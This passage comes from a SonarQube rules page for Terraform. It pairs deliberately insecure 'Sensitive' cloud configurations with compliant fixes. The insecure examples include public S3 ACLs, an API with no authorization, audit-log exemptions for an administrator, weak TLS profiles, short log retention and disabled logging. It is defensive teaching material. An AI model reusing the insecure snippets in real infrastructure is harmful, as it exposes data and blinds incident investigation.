<p>By default, when not set, the <code>aws_s3_bucket_public_access_block</code> is fully deactivated (nothing is blocked):</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;example&#34; { # Sensitive: no Public Access Block defined for this bucket
  bucket &#61; &#34;example&#34;
}
</pre>
<p>This <code>aws_s3_bucket_public_access_block</code> allows public ACL to be set:</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;example&#34; {  # Sensitive
  bucket &#61; &#34;examplename&#34;
}

resource &#34;aws_s3_bucket_public_access_block&#34; &#34;example-public-access-block&#34; {
  bucket &#61; aws_s3_bucket.example.id

  block_public_acls       &#61; false # should be true
  block_public_policy     &#61; true
  ignore_public_acls      &#61; true
  restrict_public_buckets &#61; true
}
</pre>
<h2>Compliant Solution</h2>
<p>This <code>aws_s3_bucket_public_access_block</code> blocks public ACLs and policies, ignores existing public ACLs and restricts existing public
policies:</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;example&#34; {
  bucket &#61; &#34;example&#34;
}

resource &#34;aws_s3_bucket_public_access_block&#34; &#34;example-public-access-block&#34; {
  bucket &#61; aws_s3_bucket.example.id

  block_public_acls       &#61; true
  block_public_policy     &#61; true
  ignore_public_acls      &#61; true
  restrict_public_buckets &#61; true
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html" rel="nofollow">AWS Documentation</a> - Blocking public
  access to your Amazon S3 storage </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6414">
              terraform:S6414
            </a>
          </td>
          <td>
            <details>
              <p>The Google Cloud audit logs service records administrative activities and accesses to Google Cloud resources of the project. It is important to
enable audit logs to be able to investigate malicious activities in the event of a security incident.</p>
<p>Some project members may be exempted from having their activities recorded in the Google Cloud audit log service, creating a blind spot and
reducing the capacity to investigate future security events.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The members exempted from having their activity logged have high privileges. </li><li> Compliance rules require that audit log should be activated for all members. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to have a consistent audit logging policy for all project members and therefore not to create logging exemptions for certain
members.</p>
<h2>Sensitive Code Example</h2>
<pre>
resource &#34;google_project_iam_audit_config&#34; &#34;example&#34; {
  project &#61; data.google_project.project.id
  service &#61; &#34;allServices&#34;
  audit_log_config {
    log_type &#61; &#34;ADMIN_READ&#34;
    exempted_members &#61; [ # Sensitive
      &#34;user:rogue.administrator&#64;gmail.com&#34;,
    ]
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
resource &#34;google_project_iam_audit_config&#34; &#34;example&#34; {
  project &#61; data.google_project.project.id
  service &#61; &#34;allServices&#34;
  audit_log_config {
    log_type &#61; &#34;ADMIN_READ&#34;
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/" rel="nofollow">OWASP Top 10 2021 Category A9</a> - Security Logging and
  Monitoring Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring.html" rel="nofollow">OWASP Top 10 2017 Category A10</a> -
  Insufficient Logging &amp; Monitoring </li><li> <a href="https://cloud.google.com/logging/docs/audit" rel="nofollow">GCP Documentation</a> - Cloud Audit Logs overview </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6378">
              terraform:S6378
            </a>
          </td>
          <td>
            <details>
              <p>Disabling Managed Identities can reduce an organization’s ability to protect itself against configuration faults and credentials leaks.</p>
<p>Authenticating via managed identities to an Azure resource solely relies on an API call with a non-secret token. The process is inner to Azure:
secrets used by Azure are not even accessible to end-users.</p>
<p>In typical scenarios without managed identities, the use of credentials can lead to mistakenly leaving them in code bases. In addition,
configuration faults may also happen when storing these values or assigning them permissions.</p>
<p>By transparently taking care of the Azure Active Directory authentication, Managed Identities allow getting rid of day-to-day credentials
management.</p>
<h2>Ask Yourself Whether</h2>
<p>The resource:</p>
<ul><li> Needs to authenticate to Azure resources that support Azure Active Directory (AAD). </li><li> Uses a different Access Control system that doesn’t guarantee the same security controls as AAD, or no Access Control system at all. </li></ul>
<p>There is a risk if you answered yes to all of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable the Managed Identities capabilities of this Azure resource. If supported, use a System-Assigned managed identity, as:</p>
<ul><li> It cannot be shared across resources. </li><li> Its life cycle is deeply tied to the life cycle of its Azure resource. </li><li> It provides a unique independent identity. </li></ul>
<p>Alternatively, User-Assigned Managed Identities can also be used but don’t guarantee the properties listed above.</p>
<h2>Sensitive Code Example</h2>
<p>For Typical identity blocks:</p>
<pre>
resource &#34;azurerm_api_management&#34; &#34;example&#34; { # Sensitive, the identity block is missing
  name           &#61; &#34;example&#34;
  publisher_name &#61; &#34;company&#34;
}
</pre>
<p>For connections between Kusto Clusters and Azure Data Factory:</p>
<pre>
resource &#34;azurerm_data_factory_linked_service_kusto&#34; &#34;example&#34; {
  name                 &#61; &#34;example&#34;
  use_managed_identity &#61; false # Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<p>For Typical identity blocks:</p>
<pre>
resource &#34;azurerm_api_management&#34; &#34;example&#34; {
  name           &#61; &#34;example&#34;
  publisher_name &#61; &#34;company&#34;

  identity {
    type &#61; &#34;SystemAssigned&#34;
  }
}
</pre>
<p>For connections between Kusto Clusters and Azure Data Factory:</p>
<pre>
resource &#34;azurerm_data_factory_linked_service_kusto&#34; &#34;example&#34; {
  name                 &#61; &#34;example&#34;
  use_managed_identity &#61; true
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A05</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A06</a> - Security
  Misconfiguration </li><li> <a href="https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview" rel="nofollow">Azure AD Documentation - Managed
  Identities Overview</a> </li><li> <a href="https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/managed-identity-best-practice-recommendations" rel="nofollow">Azure AD Documentation - Managed Identities Best Practices</a> </li><li> <a href="https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/services-support-managed-identities" rel="nofollow">Azure
  AD Documentation - Services that support managed identities</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6410">
              terraform:S6410
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>TLS configuration of Google Cloud load balancers is defined through SSL policies. There are three managed profiles to choose from:
<code>COMPATIBLE</code> (default), <code>MODERN</code> and <code>RESTRICTED</code>:</p>
<ul><li> The <code>RESTRICTED</code> profile relies only on secure cipher suites and should be used by applications that require to comply with the
  highest security standards. </li><li> The <code>MODERN</code> profile includes additional cipher suites that present security weaknesses like using the <code>SHA1</code> algorithm
  for signing. </li><li> The <code>COMPATIBLE</code> profile offers the most common cipher suites and thus broader compatibility. Some of these use <code>SHA1</code> or
  <code>3DES</code> algorithms which are considered weak. Also, this profile includes cipher suites that rely on obsolete key-exchange mechanisms that
  don’t provide forward secrecy[<a href="https://en.wikipedia.org/wiki/Forward_secrecy" rel="nofollow">https://en.wikipedia.org/wiki/Forward_secrecy</a>] as a
  feature. </li></ul>
<h3>Noncompliant code example</h3>
<pre>
resource &#34;google_compute_ssl_policy&#34; &#34;example&#34; {
  name            &#61; &#34;example&#34;
  min_tls_version &#61; &#34;TLS_1_2&#34;
  profile         &#61; &#34;COMPATIBLE&#34; # Noncompliant
}
</pre>
<h3>Compliant solution</h3>
<pre>
resource &#34;google_compute_ssl_policy&#34; &#34;example&#34; {
  name            &#61; &#34;example&#34;
  min_tls_version &#61; &#34;TLS_1_2&#34;
  profile         &#61; &#34;RESTRICTED&#34;
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices#23-use-secure-cipher-suites" rel="nofollow">SSL and TLS Deployment
  Best Practices</a> - Use Secure Cipher Suites </li><li> <a href="https://cloud.google.com/load-balancing/docs/ssl-policies-concepts#defining_an_ssl_policy" rel="nofollow">Google Cloud Load Balancing</a> - Defining
  an SSL policy </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6333">
              terraform:S6333
            </a>
          </td>
          <td>
            <details>
              <p>Creating APIs without authentication unnecessarily increases the attack surface on the target infrastructure.</p>
<p>Unless another authentication method is used, attackers have the opportunity to attempt attacks against the underlying API.<br /> This means attacks
both on the functionality provided by the API and its infrastructure.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The underlying API exposes all of its contents to any anonymous Internet user. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>In general, prefer limiting API access to a specific set of people or entities.</p>
<p>AWS provides multiple methods to do so:</p>
<ul><li> <code>AWS_IAM</code>, to use standard AWS IAM roles and policies. </li><li> <code>COGNITO_USER_POOLS</code>, to use customizable OpenID Connect (OIDC) identity providers (IdP). </li><li> <code>CUSTOM</code>, to use an AWS-independant OIDC provider, glued to the infrastructure with a Lambda authorizer. </li></ul>
<h2>Sensitive Code Example</h2>
<p>A public API that doesn’t have access control implemented:</p>
<pre>
resource &#34;aws_api_gateway_method&#34; &#34;noncompliantapi&#34; {
  authorization &#61; &#34;NONE&#34; # Sensitive
  http_method   &#61; &#34;GET&#34;
}
</pre>
<h2>Compliant Solution</h2>
<p>An API that implements AWS IAM permissions:</p>
<pre>
resource &#34;aws_api_gateway_method&#34; &#34;compliantapi&#34; {
  authorization &#61; &#34;AWS_IAM&#34;
  http_method   &#61; &#34;GET&#34;
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-control-access-to-api.html" rel="nofollow">AWS Documentation</a> -
  Controlling and managing access to a REST API in API Gateway </li><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6413">
              terraform:S6413
            </a>
          </td>
          <td>
            <details>
              <p>Defining a short log retention duration can reduce an organization’s ability to backtrace the actions of malicious actors in case of a security
incident.</p>
<p>Logging allows operational and security teams to get detailed and real-time feedback on an information system’s events. The logging coverage
enables them to quickly react to events, ranging from the most benign bugs to the most impactful security incidents, such as intrusions.</p>
<p>Apart from security detection, logging capabilities also directly influence future digital forensic analyses. For example, detailed logging will
allow investigators to establish a timeline of the actions perpetrated by an attacker.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This component is essential for the information system infrastructure. </li><li> This component is essential for mission-critical functions. </li><li> Compliance policies require traceability for a longer duration. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Setting log retention period to 14 days is the bare minimum. It’s recommended to increase it to 30 days or above.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/Working-with-log-groups-and-streams.html" rel="nofollow">AWS Cloudwatch Logs</a>:</p>
<pre>
resource &#34;aws_cloudwatch_log_group&#34; &#34;example&#34; {
  name &#61; &#34;example&#34;
  retention_in_days &#61; 3 # Sensitive
}
</pre>
<p>For <a href="https://docs.microsoft.com/en-us/azure/firewall-manager/policy-overview" rel="nofollow">Azure Firewall Policy</a>:</p>
<pre>
resource &#34;azurerm_firewall_policy&#34; &#34;example&#34; {
  insights {
    enabled &#61; true
    retention_in_days &#61; 7 # Sensitive
  }
}
</pre>
<p>For <a href="https://cloud.google.com/logging/docs/routing/overview#buckets" rel="nofollow">Google Cloud Logging buckets</a>:</p>
<pre>
resource &#34;google_logging_project_bucket_config&#34; &#34;example&#34; {
    project &#61; var.project
    location &#61; &#34;global&#34;
    retention_days &#61; 7 # Sensitive
    bucket_id &#61; &#34;_Default&#34;
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/Working-with-log-groups-and-streams.html" rel="nofollow">AWS Cloudwatch Logs</a>:</p>
<pre>
resource &#34;aws_cloudwatch_log_group&#34; &#34;example&#34; {
  name &#61; &#34;example&#34;
  retention_in_days &#61; 30
}
</pre>
<p>For <a href="https://docs.microsoft.com/en-us/azure/firewall-manager/policy-overview" rel="nofollow">Azure Firewall Policy</a>:</p>
<pre>
resource &#34;azurerm_firewall_policy&#34; &#34;example&#34; {
  insights {
    enabled &#61; true
    retention_in_days &#61; 30
  }
}
</pre>
<p>For <a href="https://cloud.google.com/logging/docs/routing/overview#buckets" rel="nofollow">Google Cloud Logging buckets</a>:</p>
<pre>
resource &#34;google_logging_project_bucket_config&#34; &#34;example&#34; {
    project &#61; var.project
    location &#61; &#34;global&#34;
    retention_days &#61; 30
    bucket_id &#61; &#34;_Default&#34;
}
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6412">
              terraform:S6412
            </a>
          </td>
          <td>
            <details>
              <p>When object versioning for Google Cloud Storage (GCS) buckets is enabled, different versions of an object are stored in the bucket, preventing
accidental deletion. A specific version can always be deleted when the generation number of an object version is specified in the request.</p>
<p>Object versioning cannot be enabled on a bucket with a retention policy. A retention policy ensures that an object is retained for a specific
period of time even if a request is made to delete or replace it. Thus, a retention policy locks the single current version of an object in the
bucket, which differs from object versioning where different versions of an object are retained.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The bucket stores information that require high availability. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable GCS bucket versioning and thus to have the possibility to retrieve and restore different versions of an object.</p>
<h2>Sensitive Code Example</h2>
<p>Versioning is disabled by default:</p>
<pre>
resource &#34;google_storage_bucket&#34; &#34;example&#34; { # Sensitive
  name          &#61; &#34;example&#34;
  location      &#61; &#34;US&#34;
}
</pre>
<h2>Compliant Solution</h2>
<p>Versioning is enabled:</p>
<pre>
resource &#34;google_storage_bucket&#34; &#34;example&#34; {
  name          &#61; &#34;example&#34;
  location      &#61; &#34;US&#34;

  versioning {
    enabled &#61; &#34;true&#34;
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://cloud.google.com/storage/docs/object-versioning?hl&#61;en" rel="nofollow">GCP documentation</a> - Object Versioning </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6379">
              terraform:S6379
            </a>
          </td>
          <td>
            <details>
              <p>Enabling Azure resource-specific admin accounts can reduce an organization’s ability to protect itself against account or service account
thefts.</p>
<p>Full Administrator permissions fail to correctly separate duties and create potentially critical attack vectors on the impacted resources.</p>
<p>In case of abuse of elevated permissions, both the data on which impacted resources operate and their access traceability are at risk.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This Azure resource is essential for the information system infrastructure. </li><li> This Azure resource is essential for mission-critical functions. </li><li> Compliance policies require this resource to disable its administrative accounts or permissions. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Disable the administrative accounts or permissions in this Azure resource.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.microsoft.com/en-us/azure/batch/nodes-and-pools#pools" rel="nofollow">Azure Batch Pools</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource &#34;azurerm_batch_pool&#34; &#34;example&#34; {
  name &#61; &#34;sensitive&#34;

  start_task {
    user_identity {
      auto_user {
        elevation_level &#61; &#34;Admin&#34; # Sensitive
        scope &#61; &#34;Task&#34;
      }
    }
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/container-registry/" rel="nofollow">Azure Container Registries</a>:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource &#34;azurerm_container_registry&#34; &#34;example&#34; {
  name &#61; &#34;example&#34;
  admin_enabled &#61; true # Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.microsoft.com/en-us/azure/batch/nodes-and-pools#pools" rel="nofollow">Azure Batch Pools</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
resource &#34;azurerm_batch_pool&#34; &#34;example&#34; {
  name &#61; &#34;example&#34;

  start_task {
    user_identity {
      auto_user {
        elevation_level &#61; &#34;NonAdmin&#34;
        scope &#61; &#34;Task&#34;
      }
    }
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/container-registry/" rel="nofollow">Azure Container Registries</a>:</p>
<pre data-diff-id="2" data-diff-type="compliant">
resource &#34;azurerm_container_registry&#34; &#34;exemple&#34; {
  name &#61; &#34;example&#34;
  admin_enabled &#61; false
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6258">
              terraform:S6258
            </a>
          </td>
          <td>
            <details>
              <p>Disabling logging of this component can lead to missing traceability in case of a security incident.</p>
<p>Logging allows operational and security teams to get detailed and real-time feedback on an information system’s events. The logging coverage
enables them to quickly react to events, ranging from the most benign bugs to the most impactful security incidents, such as intrusions.</p>
<p>Apart from security detection, logging capabilities also directly influence future digital forensic analyses. For example, detailed logging will
allow investigators to establish a timeline of the actions perpetrated by an attacker.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This component is essential for the information system infrastructure. </li><li> This component is essential for mission-critical functions. </li><li> Compliance policies require this component to be monitored. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable the logging capabilities of this component. Depending on the component, new permissions might be required by the logging storage
components.<br /> You should consult the official documentation to enable logging for the impacted components. For example, AWS Application Load
Balancer Access Logs <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/enable-access-logging.html" rel="nofollow">require an additional
bucket policy</a>.</p>
<h2>Sensitive Code Example</h2>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket" rel="nofollow">S3 access requests</a>:</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;example&#34; { # Sensitive
  bucket &#61; &#34;example&#34;
}
</pre>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_stage" rel="nofollow">API Gateway stages</a>:</p>
<pre>
resource &#34;aws_api_gateway_stage&#34; &#34;example&#34; { # Sensitive
  xray_tracing_enabled &#61; false # Sensitive
}
</pre>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster" rel="nofollow">MSK Broker logs</a>:</p>
<pre>
resource &#34;aws_msk_cluster&#34; &#34;example&#34; {
  cluster_name           &#61; &#34;example&#34;
  kafka_version          &#61; &#34;2.7.1&#34;
  number_of_broker_nodes &#61; 3

  logging_info {
    broker_logs { # Sensitive
      firehose {
        enabled &#61; false
      }
      s3 {
        enabled &#61; false
      }
    }
  }
}
</pre>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker" rel="nofollow">MQ Brokers</a>:</p>
<pre>
resource &#34;aws_mq_broker&#34; &#34;example&#34; {
  logs {  # Sensitive
    audit   &#61; false
    general &#61; false
  }
}
</pre>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster" rel="nofollow">Amazon DocumentDB</a>:</p>
<pre>
resource &#34;aws_docdb_cluster&#34; &#34;example&#34; { # Sensitive
  cluster_identifier &#61; &#34;example&#34;
}
</pre>
<p>For Azure <a href="https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service" rel="nofollow">App Services</a>:</p>
<pre>
resource &#34;azurerm_app_service&#34; &#34;example&#34; {
  logs {
    application_logs {
      file_system_level &#61; &#34;Off&#34; # Sensitive
      azure_blob_storage {
        level &#61; &#34;Off&#34;           # Sensitive
      }
    }
  }
}
</pre>
<p>For GCP <a href="https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_subnetwork/" rel="nofollow">VPC Subnetwork</a>:</p>
<pre>
resource &#34;google_compute_subnetwork&#34; &#34;example&#34; { # Sensitive
  name          &#61; &#34;example&#34;
  ip_cidr_range &#61; &#34;10.2.0.0/16&#34;
  region        &#61; &#34;us-central1&#34;
  network       &#61; google_compute_network.example.id
}
</pre>
<p>For GCP <a href="https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance/" rel="nofollow">SQL Database
Instance</a>:</p>
<pre>
resource &#34;google_sql_database_instance&#34; &#34;example&#34; {
  name &#61; &#34;example&#34;

  settings { # Sensitive
    tier &#61; &#34;db-f1-micro&#34;
    ip_configuration {
      require_ssl  &#61; true
      ipv4_enabled &#61; true
    }
  }
}
</pre>
<p>For GCP <a href="https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster/" rel="nofollow">Kubernetes Engine (GKE)
cluster</a>:</p>
<pre>
resource &#34;google_container_cluster&#34; &#34;example&#34; {
  name               &#61; &#34;example&#34;
  logging_service    &#61; &#34;none&#34; # Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket" rel="nofollow">S3 access requests</a>:</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;example-logs&#34; {
  bucket &#61; &#34;example_logstorage&#34;
  acl    &#61; &#34;log-delivery-write&#34;
}

resource &#34;aws_s3_bucket&#34; &#34;example&#34; {
  bucket &#61; &#34;example&#34;

  logging { # AWS provider &lt;&#61; 3
      target_bucket &#61; aws_s3_bucket.example-logs.id
      target_prefix &#61; &#34;log/example&#34;
  }
}

resource &#34;aws_s3_bucket_logging&#34; &#34;example&#34; { # AWS provider &gt;&#61; 4
  bucket &#61; aws_s3_bucket.example.id

  target_bucket &#61; aws_s3_bucket.example-logs.id
  target_prefix &#61; &#34;log/example&#34;
}
</pre>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_stage" rel="nofollow">API Gateway stages</a>:</p>
<pre>
resource &#34;aws_api_gateway_stage&#34; &#34;example&#34; {
  xray_tracing_enabled &#61; true

  access_log_settings {
    destination_arn &#61; &#34;arn:aws:logs:eu-west-1:123456789:example&#34;
    format &#61; &#34;...&#34;
  }
}
</pre>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster" rel="nofollow">MSK Broker logs</a>:</p>
<pre>
resource &#34;aws_msk_cluster&#34; &#34;example&#34; {
  cluster_name           &#61; &#34;example&#34;
  kafka_version          &#61; &#34;2.7.1&#34;
  number_of_broker_nodes &#61; 3

  logging_info {
    broker_logs {
      firehose   {
        enabled &#61; false
      }
      s3 {
        enabled &#61; true
        bucket  &#61; &#34;example&#34;
        prefix  &#61; &#34;log/msk-&#34;
      }
    }
  }
}
</pre>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker" rel="nofollow">MQ Brokers</a>, enable
<code>audit</code> or <code>general</code>:</p>
<pre>
resource &#34;aws_mq_broker&#34; &#34;example&#34; {
  logs {
    audit   &#61; true
    general &#61; true
  }
}
</pre>
<p>For Amazon <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster" rel="nofollow">Amazon DocumentDB</a>:</p>
<pre>
resource &#34;aws_docdb_cluster&#34; &#34;example&#34; {
  cluster_identifier              &#61; &#34;example&#34;
  enabled_cloudwatch_logs_exports &#61; [&#34;audit&#34;]
}
</pre>
<p>For Azure <a href="https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service" rel="nofollow">App Services</a>:</p>
<pre>
resource &#34;azurerm_app_service&#34; &#34;example&#34; {
 logs {
    http_logs {
      file_system {
        retention_in_days &#61; 90
        retention_in_mb   &#61; 100
      }
    }

 application_logs {
      file_system_level &#61; &#34;Error&#34;
      azure_blob_storage {
        retention_in_days &#61; 90
        level             &#61; &#34;Error&#34;
      }
    }
  }
}
</pre>
<p>For GCP <a href="https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_subnetwork/" rel="nofollow">VPC Subnetwork</a>:</p>
<pre>
resource &#34;google_compute_subnetwork&#34; &#34;example&#34; {
  name          &#61; &#34;example&#34;
  ip_cidr_range &#61; &#34;10.2.0.0/16&#34;
  region        &#61; &#34;us-central1&#34;
  network       &#61; google_compute_network.example.id

  log_config {
    aggregation_interval &#61; &#34;INTERVAL_10_MIN&#34;
    flow_sampling        &#61; 0.5
    metadata             &#61; &#34;INCLUDE_ALL_METADATA&#34;
  }
}
</pre>
<p>For GCP <a href="https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance/" rel="nofollow">SQL Database
Instance</a>:</p>
<pre>
resource &#34;google_sql_database_instance&#34; &#34;example&#34; {
  name             &#61; &#34;example&#34;

  settings {
    ip_configuration {
      require_ssl  &#61; true
      ipv4_enabled &#61; true
    }
    database_flags {
      name  &#61; &#34;log_connections&#34;
      value &#61; &#34;on&#34;
    }
    database_flags {
      name  &#61; &#34;log_disconnections&#34;
      value &#61; &#34;on&#34;
    }
    database_flags {
      name  &#61; &#34;log_checkpoints&#34;
      value &#61; &#34;on&#34;
    }
    database_flags {
      name  &#61; &#34;log_lock_waits&#34;
      value &#61; &#34;on&#34;
    }
  }
}
</pre>
<p>For GCP <a href="https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster/" rel="nofollow">Kubernetes Engine (GKE)
cluster</a>:</p>
<pre>
resource &#34;google_container_cluster&#34; &#34;example&#34; {
  name               &#61; &#34;example&#34;
  logging_service    &#61; &#34;logging.googleapis.com/kubernetes&#34;
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/" rel="nofollow">OWASP Top 10 2021 Category A9</a> - Security Logging and
  Monitoring Failures </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/ServerLogs.html" rel="nofollow">AWS Documentation</a> - Logging requests using server access
  logging </li><li> <a href="https://cwe.mitre.org/data/definitions/778" rel="nofollow">MITRE, CWE-778</a> - Insufficient Logging </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring" rel="nofollow">OWASP Top 10 2017 Category A10</a> -
  Insufficient Logging &amp; Monitoring </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6330">
              terraform:S6330
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Queue Service (SQS) is a managed message queuing service for application-to-application (A2A) communication. Amazon SQS can store
messages encrypted as soon as they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message
from the file system, for example through a vulnerability in the service, they are not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The queue contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
